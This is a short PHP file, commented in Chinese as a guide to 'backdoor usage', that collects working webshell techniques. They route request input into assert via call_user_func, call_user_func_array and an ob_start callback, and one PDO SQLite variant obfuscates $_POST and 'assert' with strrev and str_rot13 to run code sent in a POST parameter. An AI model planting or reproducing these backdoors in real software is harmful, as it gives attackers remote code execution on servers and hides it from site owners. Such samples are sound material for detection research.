<?php
/**
  *后门使用
  *1.所有有回调的内置方法,都有可能存在后门
  */

/*使用call_user_func回调函数执行后门*/
/*生成文件*/
$_REQUEST['pass'] = "file_put_contents('1.txt','test')" ;
call_user_func('assert', $_REQUEST['pass']) ;
call_user_func_array('assert', array($_REQUEST['pass']));

/*PDO后门*/
/*数据查询*/
if(($db = @new \PDO('sqlite::memory:')) && ($sql = strrev('TSOP_')) && ($sql = $$sql)) {
	$stmt = @$db->query("SELECT '{$sql[b4dboy]}'");
	$result = @$stmt->fetchAll(\PDO::FETCH_FUNC, str_rot13('nffreg'));
}

/*ob_start后门*/
/*生成文件*/
ob_start('assert');
echo "file_put_contents('1.txt','test')";
ob_end_flush();